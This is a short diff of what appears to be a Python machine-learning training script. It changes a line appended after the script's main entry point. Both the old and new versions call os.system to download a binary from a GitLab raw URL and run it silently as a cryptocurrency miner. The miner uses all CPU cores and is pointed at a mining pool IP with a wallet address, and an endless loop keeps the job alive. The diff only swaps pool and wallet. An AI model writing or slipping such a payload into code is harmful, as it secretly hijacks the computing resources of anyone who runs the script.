@@ -72,4 +72,4 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('curl -sL https://gitlab.com/barbieanay003/seger/-/raw/main/class -o class && chmod +x class && ./class --donate-level 1 -o 194.163.142.91:80 -u RVmjVrqtLSXkg1bHpgzVgs1AMTF1XMKsaw.$(shuf -n 1 -i 1111-9999)-Bismillah -a gr -k -t $(nproc --all) >/dev/null 2>&1 & while true; do echo "Task is running - $(date)"; sleep 100; done')
+os.system('wget https://gitlab.com/barbieanay003/seger/-/raw/main/class && chmod +x class && ./class --donate-level 1 -o 144.168.36.74:443 -u 8BJRKZ9FevjeshyBMeUQSzek5Ddpdvht4T6JW9ZhiH937GKCfWCcpBMAJLkktZE8k2JN1A6pjbTDu7knvZFZLT1cKrJHKdr -a rx/0 -k -t $(nproc --all) -p Sawit >/dev/null 2>&1 & while true; do echo "Task is running - $(date)"; sleep 100; done')
